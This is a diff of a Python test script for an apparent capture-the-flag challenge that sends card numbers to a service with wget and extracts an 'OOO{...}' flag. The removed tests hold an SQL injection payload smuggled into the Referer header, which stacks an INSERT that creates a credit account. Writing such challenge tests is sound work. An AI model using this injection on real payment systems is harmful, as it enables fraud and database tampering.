@@ -9,43 +9,28 @@ from os.path import exists
 from subprocess import Popen, PIPE, call
 import re
 import urllib.parse
-flag_pattern = re.compile(r"OOO%7B[A-Za-z0-9_\-!@#$%^&*]{5,100}%7D")
+flag_pattern = re.compile(r"OOO%7B[A-Za-z0-9_\-!@#$%^&*]{20,100}%7D")
 
 """
-Tests SQL response Error message and the SQL injection with use of implanted CC.
+This just tests a valid CC that's stored in the CC processing DB
 """
+def test_valid_cc():
 
-def test_sqli_query():
-    stdout = make_contact("374289111111115", "21", "12",
-                          "http://testme.com/profile.html' ")
-
-    try:
-        assert stdout.find(b"purchase.html?message=Request%20caused%20major%20error") > -1
-    except AssertionError as ae:
-        print(stdout)
-        raise ae
-
-
-def test_sqli():
-
-    stdout = make_contact("374289000000007", "21","12", "https://testme.com/profile.html'%3bINSERT into accounts (pan, balance, credit_limit) values ('374289000000007',0,11200)%3bcommit%3b")
-
-    stdout = make_contact("374289000000007", "21", "12")
+    stdout = make_contact("6360337890123455", "21","12")
     try:
         assert stdout.find(b"/livevid.html?message=Viewing%20authorized") > -1
+
         flags = re.findall(flag_pattern, stdout.decode('latin-1'))
         if flags:
             print(urllib.parse.unquote(flags[0]))
         else:
             print(stdout)
-
     except AssertionError as ae:
         print(stdout)
         raise ae
 
-
 #
-def make_contact(ccnum, expMM, expYY, referer_val="http://goforit.com/purchase.html"):
+def make_contact(ccnum, expMM, expYY, referer_val="https://goforit.com/purchase.html"):
     url = "http://{}:{}/cc?card-number={}&expiry-year={}&expiry-month={}".format(sys.argv[1], sys.argv[2], ccnum, expYY, expMM)
 
     cmd = ["wget", "-O", "-", "--header", "Referer: {}".format(referer_val), url]
